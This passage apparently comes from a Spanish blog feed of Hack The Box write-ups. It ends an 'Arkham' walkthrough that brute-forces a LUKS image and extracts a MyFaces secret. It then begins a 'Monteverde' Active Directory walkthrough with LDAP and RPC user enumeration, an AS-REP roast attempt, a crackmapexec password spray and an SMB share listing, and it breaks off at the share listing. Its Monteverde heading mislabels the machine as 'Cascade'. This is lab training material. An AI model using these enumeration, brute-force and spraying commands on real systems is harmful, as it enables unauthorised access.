&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# file backup.img &lt;/span&gt;
backup.img: &lt;span class=&quot;s2&quot;&gt;&quot;LUKS encrypted file&quot;&lt;/span&gt;, ver 1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a usar la tool cryptsetup&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cryptsetup luksOpen backup.img arkhamdata&lt;/span&gt;
Introduzca la frase contraseña de backup.img: 
No hay ninguna clave disponible con esa frase contraseña.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a buscar un recurso llamado BruteForce-Luks en github para clonarnoslo&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# git clone &quot;https://github.com/glv2/bruteforce-luks&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a seguir los pasos de la instalacion&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./autogen.sh
./configure.sh
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;dh-autoreconf
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;libcryptsetup-dev
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a usarlo para bruteforcear el comprimido backup.img&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# bruteforce-luks -f dicc backup.img&lt;/span&gt;
Warning: using dictionary mode, ignoring options &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; and &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

Tried passwords: 1
Tried passwords per second: 0,500000
Last tried password: batmanforever

Password found: &lt;span class=&quot;s2&quot;&gt;&quot;batmanforever&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Almacenamos la contraseña en un archivo y proseguimos intentando lo siguiente&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cryptsetup luksOpen backup.img ArkhamD                                                                                                                                                                     5 ⨯&lt;/span&gt;
Introduzca la frase contraseña de backup.img: &lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos crea un directorio en la ruta /dev/mapper/&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ls /dev/mapper/ArkhamD   &lt;/span&gt;
/dev/mapper/ArkhamD

&lt;span class=&quot;c&quot;&gt;# mount /dev/mapper/ArkhamD /mnt/ArkhamD&lt;/span&gt;
mount: /mnt/ArkhamD: mount point does not exist.

&lt;span class=&quot;c&quot;&gt;# mount /dev/mapper/ArkhamD /mnt/ArkhamD&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# cd /mnt/ArkhamD&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ls                       &lt;/span&gt;
lost+found  Mask  web-xml-bak
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a traernos el archivo web-xml-bak a nuestro equipo&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cat web-xml-bak  &lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;param-name&amp;gt;org.apache.myfaces.SECRET &amp;lt;param-name&amp;gt;&quot;&lt;/span&gt;                                                                                                                                                                 
&amp;lt;param-value&amp;gt;&lt;span class=&quot;s2&quot;&gt;&quot;SnNGOTg3Ni0=&quot;&lt;/span&gt;&amp;lt;/param-value&amp;gt;                                                                                                                                                                            
&amp;lt;/context-param&amp;gt;                                                                                                                                                                                                   
    &amp;lt;context-param&amp;gt;                                                                                                                                                                                                
        &amp;lt;param-name&amp;gt;org.apache.myfaces.MAC_ALGORITHM&amp;lt;/param-name&amp;gt;                                                                                                                                                  
        &amp;lt;param-value&amp;gt;&lt;span class=&quot;s2&quot;&gt;&quot;HmacSHA1&quot;&lt;/span&gt;&amp;lt;/param-value&amp;gt;                                                                                                                                                                        
     &amp;lt;/context-param&amp;gt;                                                                                                                                                                                              
&amp;lt;context-param&amp;gt;                                                                                                                                                                                                    
&amp;lt;param-name&amp;gt;&lt;span class=&quot;s2&quot;&gt;&quot;org.apache.myfaces.MAC_SECRET&quot;&lt;/span&gt;&amp;lt;/param-name&amp;gt;                                                                                                                                                             
&amp;lt;param-value&amp;gt;&lt;span class=&quot;s2&quot;&gt;&quot;SnNGOTg3Ni0=&quot;&lt;/span&gt;&amp;lt;/param-value&amp;gt;                                                                                                                                                                            
&amp;lt;/context-param&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Encontramos una cadena en base64 que nos parece a un secreto de encryptacion en HmacSHA1&lt;/p&gt;</content><author><name>K0Hack</name></author><category term="HTB," /><category term="Command" /><category term="Injection," /><category term="LFI," /><category term="Maquinas" /><category term="Retiradas," /><category term="Post-Explotacion." /><summary type="html">Arkham ~ Hack The Box ~ Batman</summary></entry><entry><title type="html">Maquina Retirada Monteverde AD de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2022/03/05/Monteverde.html" rel="alternate" type="text/html" title="Maquina Retirada Monteverde AD de Hack The Box (Necesario VIP)" /><published>2022-03-05T00:00:00-03:00</published><updated>2022-03-05T00:00:00-03:00</updated><id>http://localhost:4000/2022/03/05/Monteverde</id><content type="html" xml:base="http://localhost:4000/2022/03/05/Monteverde.html">&lt;h1 id=&quot;cascade---ad-path--hack-the-box&quot;&gt;Cascade - AD Path ~ Hack The Box&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2022-04-28 14:24:27Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
61610/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2022-04-28T14:25:17
|_  start_date: N/A
|_clock-skew: 5m45s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a enumerar el puerto 389 o servicio de Ldap&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ldapsearch -x -h 10.10.10.172 -b &apos;DC=MEGABANK,DC=LOCAL&apos;   → para enumerar users&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ldapsearch -x -h 10.10.10.172 -b &apos;DC=MEGABANK,DC=LOCAL&apos; | grep &quot;userPrincipalName&quot; | awk &apos;{print $2}&apos; | tr &apos;@&apos; &apos; &apos; | awk &apos;{print $1}&apos; &lt;/span&gt;
 
mhope
SABatchJobs                                                 
svc-ata                                
svc-bexec                              
svc-netapp                                                                                               
dgalanos                               
roleary                                
smorgan 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a usar la herramienta RPCCLIENT para seguir enumerando&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# rpcclient -U &apos;&apos; 10.10.10.172 -N &lt;/span&gt;

rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;enumdomusers &quot;&lt;/span&gt;                                                                                                                                           
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]                 
user:[mhope] rid:[0x641]               
user:[SABatchJobs] rid:[0xa2a]            
user:[svc-ata] rid:[0xa2b]             
user:[svc-bexec] rid:[0xa2c]                   
user:[svc-netapp] rid:[0xa2d]                                        
user:[dgalanos] rid:[0xa35]            
user:[roleary] rid:[0xa36]                    
user:[smorgan] rid:[0xa37]    
                                                                                                                                                                                     
rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; enumdomgroups &quot;&lt;/span&gt;                                
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]       
group:[Domain Guests] rid:[0x202]                         
group:[Domain Computers] rid:0x203]                                                                                                                                  
group:[Group Policy Creator Owners] rid:[0x208]                                           
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]                                                                                                                  
group:[Azure Admins] rid:[0xa29]                                                                                         
group:[File Server Admins] rid:[0xa2e]                                                          
group:[Call Recording Admins] rid:[0xa2f]                        
group:[Reception] rid:[0xa30]          
group:[Operations] rid:[0xa31]                                     
group:[Trading] rid:[0xa32]                 
group:[HelpDesk] rid:[0xa33]                  
group:[Developers] rid:[0xa34]  

Listamos usuarios para el grupo de Azure Admins:
rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; querygroupmem 0xa29 &quot;&lt;/span&gt;      
         rid:[0x1f4] attr:[0x7]                  
        rid:[0x450] attr:[0x7]                 
        rid:[0x641] attr:[0x7]
        
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enumeramos que usuarios pertenecen al grupo Azure Admins ( el Grupo Mas Interesante ):&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; queryuser 0x1f4                                                                                                                                                                               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;9/1813]
result was NT_STATUS_ACCESS_DENIED     
                                                                                                                                                                            
rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;queryuser 0x450   &quot;&lt;/span&gt;     
        User Name   :   AAD_987d7f2f57d2       
        Full Name   :   AAD_987d7f2f57d2       
        Home Drive  :                          
        Dir Drive   :                          
        Profile Path:                         
        Logon Script:
        Description :   Service account &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      jue, 28 abr 2022 16:15:33 CEST
        Logoff Time              :      jue, 01 ene 1970 01:00:00 CET
        Kickoff Time             :      jue, 01 ene 1970 01:00:00 CET
        Password last &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;Time   :      jue, 02 ene 2020 23:53:25 CET
        Password can change Time :      vie, 03 ene 2020 23:53:25 CET
        Password must change Time:      jue, 14 sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x450
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000000a
        padding1[0..7]...
        logon_hrs[0..21]...

rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;queryuser 0x641&quot;&lt;/span&gt;
        User Name   :  &lt;span class=&quot;s2&quot;&gt;&quot; mhope&quot;&lt;/span&gt;
        Full Name   :   Mike Hope
        Home Drive  :   &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;monteverde&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;mhope
        Dir Drive   :   H:
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      vie, 03 ene 2020 14:29:59 CET
        Logoff Time              :      jue, 01 ene 1970 01:00:00 CET
        Kickoff Time             :      jue, 14 sep 30828 04:48:05 CEST
        Password last &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;Time   :      vie, 03 ene 2020 00:40:06 CET
        Password can change Time :      sáb, 04 ene 2020 00:40:06 CET
        Password must change Time:      jue, 14 sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x641
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000002
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enumeramos mas Usuarios para nuestro diccionario de Usuarios&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# rpcclient -U &apos;&apos; 10.10.10.172 -N -c &apos;enumdomusers&apos; | grep -oP &quot;\[.*?\]&quot; | tr &apos;[]&apos; &apos; &apos; | grep -v 0x  &lt;/span&gt;
 Guest 
 AAD_987d7f2f57d2 
 mhope 
 SABatchJobs 
 svc-ata 
 svc-bexec 
 svc-netapp 
 dgalanos 
 roleary 
 smorgan 
 
&lt;span class=&quot;s2&quot;&gt;&quot;Los añadimos a nuestro potencial listado de usuarios de  AD ---&amp;gt; users.txt &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a hacer una ASPREPROAST ATTACK&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# GetNPUsers.py megabank.local/ -no-pass -usersfile users.txt        &lt;/span&gt;
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User mhope doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set
[-] User SABatchJobs doesn&apos;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User svc-ata doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-bexec doesn&apos;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User svc-netapp doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set
[-] User dgalanos doesn&apos;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User roleary doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set
[-] User smorgan doesn&apos;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Clients credentials have been revoked&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User AAD_987d7f2f57d2 doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set
[-] User mhope doesn&apos;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User SABatchJobs doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ata doesn&apos;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User svc-bexec doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-netapp doesn&apos;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User dgalanos doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set
[-] User roleary doesn&apos;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User smorgan doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set

No funciona
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Probamos a Realizar un ataque de Password Spray con Crackmapexec usando porque no como PASSWORDS el mismo listado de Users&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.10.172 -u users.txt -p users.txt   &lt;/span&gt;
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:MONTEVERDE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:MEGABANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE     &lt;span class=&quot;s2&quot;&gt;&quot;  [+] MEGABANK.LOCAL&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ABatchJobs:SABatchJobs    &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Probamos a listar recursos compartidos por SMB para este usuario&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.172 -u &apos;SABatchJobs&apos; -p &apos;SABatchJobs&apos;     &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 NO ACCESS       Remote Admin
        azure_uploads                                           READ ONLY
        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
        E&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                   READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 READ ONLY
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

